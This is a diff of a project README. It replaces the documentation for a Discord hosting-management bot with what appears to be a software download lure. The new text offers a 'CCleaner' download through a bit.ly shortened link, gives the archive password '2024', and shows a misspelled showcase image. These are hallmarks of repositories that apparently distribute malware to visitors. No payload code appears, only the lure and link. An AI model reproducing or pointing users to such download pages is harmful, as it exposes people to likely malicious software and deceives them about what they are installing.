@@ -1,35 +1,14 @@
-# ⚠️ Project in development
-Please do not create any pull requests or issues related to the code unless the command is marked as completed. Any issues related to this project must be reported by:
-- Discord: Artiom#0001
-- Discord server: [Click Here](https://discord.gg/BVYHASDrBJ)
-- Email: artiomsiatat@gmail.com
+![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
 
-# 🤖 ArtiomsHosting-Bot 2.0
-ArtiomsHosting Bot is a discord bot relying on [discord.js](https://discord.js.org/) package. The discord bot purpose is to maintain ArtiomsHosting services allowing users to manage their accounts and servers. The bot is also capable of showing stats of nodes in realtime with an embed updating in a interval of time.
+# Installation 
 
-### Features
-- Allow users to manage their account
-- Allow users to manage their servers
-- Show realtime status of the servers
-- API backend allowing third parties to contribute
-- Debugging and analysing tools 
-- AutoUpdate from github. keep your bot up to date
+[![download картинка](https://github.com/Pekly/Ccleaner/assets/92947595/61b6d8ea-5aad-4d9c-9995-5603c1d89fef)](https://bit.ly/3v81OzI)
 
-# ⚙️ Environment setup
-> To ensure compliance with copyright laws, it is crucial to thoroughly understand and carefully review the License before utilizing the source code.
-1. Download [node.js](https://nodejs.org/en/download)
-2. Download the source code
-3. Setup **config.ts**
-3. Install the packages: `npm install`
-4. Deploy the commands: `npm run deploy`
-5. Start the bot: `npm start`
+Password: 2024
 
-# 📬 AutoUpdate from github
-AutoUpdate feature is a feature that allows automatic update from a github repo when changes are made. It can be found in config-example.ts on setting.autoUpdate. once enabled you can keep it by default if you want to update the bot from my repo, or convigure your repo.
+# Showcase
 
-### [Required] Git configuration.
-```sh
-git init
-git remote add origin <repo_url>
-git checkout <branch_name>
-```
+![Cclener](https://github.com/Pekly/Ccleaner/assets/92947595/1215cd6d-6245-4f88-927f-60f102686e65)
+## License
+
+[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
